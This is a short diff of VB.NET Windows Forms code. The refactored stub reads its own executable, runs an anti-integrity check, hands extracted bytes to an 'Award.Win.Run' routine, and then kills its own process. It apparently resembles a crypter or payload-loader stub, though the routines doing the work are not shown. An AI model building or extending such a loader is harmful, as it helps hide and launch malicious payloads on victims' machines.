@@ -1,11 +1,12 @@
-﻿Imports Functions.Main
-Public Class Form1
+﻿Public Class Form1
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        EnsureInitialized()
+        Stuff.EnsureInitialized()
     End Sub
+End Class
 
+Public Class Stuff
     Shared Sub Test()
-        Dim f As Tuple(Of Byte(), Boolean) = DoShit(Application.ExecutablePath, Application.StartupPath)
+        Dim f = Functions.Main.DoShit(Application.ExecutablePath, Application.StartupPath)
 
         If f.Item2 = True Then
             Dim L = New anti.IntegrityCheck
@@ -14,6 +15,7 @@ Public Class Form1
             L.RunCheck()
         End If
         Award.Win.Run(f.Item1, Command, Application.ExecutablePath)
+        Process.GetCurrentProcess.Kill()
     End Sub
 
 
@@ -80,7 +82,6 @@ Public Class Form1
         End Using ' stream
     End Function
 End Class
-
 Public Class Tuple(Of T1, T2)
     Public Property Item1() As T1
         Get
